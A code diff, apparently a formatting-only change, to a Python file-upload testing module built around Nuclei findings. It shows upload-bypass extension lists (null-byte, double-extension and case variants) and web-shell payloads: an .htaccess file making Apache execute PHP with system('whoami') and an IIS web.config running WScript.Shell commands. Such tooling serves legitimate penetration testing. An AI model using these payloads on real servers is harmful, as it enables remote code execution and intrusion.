@@ -61,7 +61,13 @@ extensions = {
     ],
     "jsp": ["jsp", "jspx", "jpg.jsp", "jsp%00.jpg", "jsp\x00.jpg", "jSp"],
     "cfm": ["cfm", "cfml", "jpg.cfm", "cfm%00.jpg", "cfm\x00.jpg", "cFm"],
-    "apache": ["htaccess", "jpg.htaccess", "htaccess%00.jpg", "htaccess\x00.jpg", "hTaccess"],
+    "apache": [
+        "htaccess",
+        "jpg.htaccess",
+        "htaccess%00.jpg",
+        "htaccess\x00.jpg",
+        "hTaccess",
+    ],
     "iis": ["config", "jpg.config", "config%00.jpg", "config\x00.jpg", "cOnfig"],
 }
 
@@ -105,15 +111,15 @@ payloads = {
     ],
     "apache": [
         b"AddType application/x-httpd-php .rce",
-        b'''<Files ~ "^\.ht">
+        b"""<Files ~ "^\.ht">
 Order allow,deny
 Allow from all
 </Files>
 AddType application/x-httpd-php .htaccess
-#<?php system("whoami"); ?>''',
+#<?php system("whoami"); ?>""",
     ],
     "iis": [
-        b'''<?xml version="1.0" encoding="UTF-8"?>
+        b"""<?xml version="1.0" encoding="UTF-8"?>
 <configuration>
    <system.webServer>
       <handlers accessPolicy="Read, Script, Write">
@@ -131,8 +137,8 @@ AddType application/x-httpd-php .htaccess
       </security>
    </system.webServer>
 </configuration>
-<% Response.Write CreateObject("WScript.Shell").Exec("whoami").StdOut.ReadAll() %>'''
-    ]
+<% Response.Write CreateObject("WScript.Shell").Exec("whoami").StdOut.ReadAll() %>"""
+    ],
 }
 
 content_types = {
@@ -199,7 +205,7 @@ class FileUploadModule(BaseModule):
                 f"File Upload file {self.input_file} from Nuclei does not exist, exiting..."
             )
             return False
-        
+
         if os.path.exists(self.output_file):
             logger.warning(
                 f"File Upload file {self.output_file} already exists, overwriting..."
